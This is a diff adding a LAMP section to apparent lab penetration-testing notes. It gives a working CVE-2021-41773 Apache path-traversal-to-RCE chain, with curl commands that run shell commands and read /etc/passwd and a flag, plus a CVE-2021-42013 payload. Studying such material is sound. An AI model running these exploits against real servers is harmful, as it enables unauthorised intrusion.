@@ -10,6 +10,7 @@ Fingerprinting modern web stacks from passive HTTP signals, then exploiting a kn
 - [MERN stack](#mern-stack)
 - [Next.js](#nextjs)
 - [Django](#django)
+- [LAMP](#lamp)
 
 ---
 
@@ -22,6 +23,7 @@ The big picture before the jargon. The real skill here isn't memorising exploits
 | **MERN** (Express) | `X-Powered-By: Express`, `connect.sid` cookie | Sloppy custom JavaScript merges your input into a **shared object** — change that one shared thing and *everything* copying from it becomes admin. |
 | **Next.js** | `X-Powered-By: Next.js`, `window.__next_f` | The app **trusts an internal header it shouldn't** — send it yourself and the login check is skipped. |
 | **Django** | `WSGIServer` server header, `csrfmiddlewaretoken` field | You get to **pick the sort column**, and it's pasted straight into SQL — so you rewrite the query and read the database. |
+| **LAMP** (Apache) | `Server: Apache/2.4.49`, `403` on `/cgi-bin/` | A URL-encoding trick lets you **walk out of the web folder** — reach `/bin/sh` and run commands as the server. |
 
 <div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
 <strong>How to use these notes:</strong> don't try to recall the exact payloads from memory — nobody does that. These notes are your <em>lookup sheet</em>. Remember the one-line hook above; come back here for the commands when you need them.
@@ -203,4 +205,84 @@ From here, feed the injection point to **sqlmap** to enumerate and dump the full
 
 <div style="background:#fff7ed;border-left:4px solid #f59e0b;padding:12px;border-radius:6px;margin:8px 0">
 <strong>Warning:</strong> The <code>updatexml()</code> error technique only works when <code>DEBUG = True</code> in <code>settings.py</code> — a production app (<code>DEBUG = False</code>) returns a generic 500 with no details. Verify first; if debug output is suppressed, fall back to blind time-based injection with <code>SLEEP()</code>.
+</div>
+
+---
+
+## LAMP
+
+**LAMP** = Linux, Apache, MySQL, PHP — one of the oldest web stacks, and still common in legacy systems and enterprise apps because every component is open-source, stable, and simple to deploy. Linux is the OS, **Apache** handles requests, **MySQL** holds the data, **PHP** runs the server-side logic.
+
+**Typical Ubuntu deployment:** Apache runs as `www-data`, serves files from `/var/www/html`, and hands dynamic requests to PHP via `mod_php` or PHP-FPM. Common attack surfaces: exposed PHP files, verbose database errors, weak file permissions, misconfigured Apache/PHP settings.
+
+### Fingerprinting
+
+```bash
+curl -I http://TARGET:8080/
+```
+
+| Signal | Value | Confidence |
+| --- | --- | --- |
+| `Server` header | `Apache/2.4.49 (Unix)` | High — exact CVE match |
+| 404 page footer | repeats the `Apache/2.4.49` version string | High |
+| `/cgi-bin/` response | `403 Forbidden` (not `404`) | High — confirms `mod_cgi` enabled |
+
+- **`Server: Apache/2.4.49 (Unix)`** on its own is enough to point at **CVE-2021-41773** — this header maps to that exact version.
+- A **404** on a made-up path repeats the same version string in the error page footer, useful when the `Server` header has been stripped:
+
+```bash
+curl -v http://TARGET:8080/nonexistent
+# -> 404 Not Found, footer/headers still show Apache/2.4.49 (Unix)
+```
+
+- **`/cgi-bin/` → 403, not 404** tells you the directory exists and directory listing is off — i.e. `mod_cgi` is configured. This exploit needs `mod_cgi`, so this check is required, not optional:
+
+```bash
+curl -v http://TARGET:8080/cgi-bin/
+# -> 403 Forbidden (exists, mod_cgi likely on)
+```
+
+### CVE-2021-41773 — Path Traversal → RCE
+
+Apache 2.4.49 changed `ap_normalize_path()`, and the change broke the path-traversal filter's *ordering*: the filter checks for `../` **before** the URL is fully decoded.
+
+Send `.%2e/` — a literal dot, then a URL-encoded dot (`%2e`), then a slash. The filter doesn't recognise this as `../` and lets it through. But when Apache later hands the path to the filesystem, the OS decodes `%2e` back to `.` and resolves `.%2e/` as `../` — the traversal filter has been bypassed.
+
+That alone gives directory traversal for **reading files**. It becomes **RCE** because `/cgi-bin/` has CGI execution enabled: if the traversal resolves onto an executable like `/bin/sh`, Apache runs it as a CGI script and pipes the HTTP **POST body** to its stdin.
+
+```bash
+# curl normalises .%2e/ away by default — this flag stops that
+curl -v --path-as-is "http://TARGET:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" --data 'id'
+```
+
+<div style="background:#fff7ed;border-left:4px solid #f59e0b;padding:12px;border-radius:6px;margin:8px 0">
+<strong>Warning:</strong> <code>curl</code> normalises URLs before sending — without <code>--path-as-is</code> it silently cleans up the <code>.%2e/</code> sequences, the server never sees the encoded dots, and traversal requests come back <code>403</code> instead of executing.
+</div>
+
+**Step 1 — confirm RCE.** Four `.%2e/` segments climb from `/cgi-bin/` up to `/bin/sh`. The `echo Content-Type: text/plain; echo;` preamble is required by the CGI spec — Apache needs a valid HTTP header block before the body or it returns `500`; the bare `echo` supplies the blank separator line:
+
+```bash
+curl -s --path-as-is "http://10.129.175.13:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
+  --data 'echo Content-Type: text/plain; echo; id'
+# -> uid=1(daemon) gid=1(daemon) groups=1(daemon)
+```
+
+RCE confirmed, running as `daemon` — the same low-privilege user Apache runs as.
+
+**Step 2 — read system accounts:**
+
+```bash
+curl -s --path-as-is "http://10.129.175.13:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
+  --data 'echo Content-Type: text/plain; echo; cat /etc/passwd'
+```
+
+**Step 3 — read the flag:**
+
+```bash
+curl -s --path-as-is "http://10.129.175.13:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
+  --data 'echo Content-Type: text/plain; echo; cat /flag.txt'
+```
+
+<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
+<strong>Info:</strong> CVE-2021-41773 is version-specific — <strong>Apache 2.4.49 only</strong>. The 2.4.50 patch blocked single-encoded dots but not double-encoding (tracked separately as <strong>CVE-2021-42013</strong>, using <code>%%32%65%%32%65/</code>). 2.4.51+ is fully patched. A <code>Server</code> header showing <code>Apache/2.4.49</code> or <code>Apache/2.4.50</code> is an immediate signal to try this chain.
 </div>
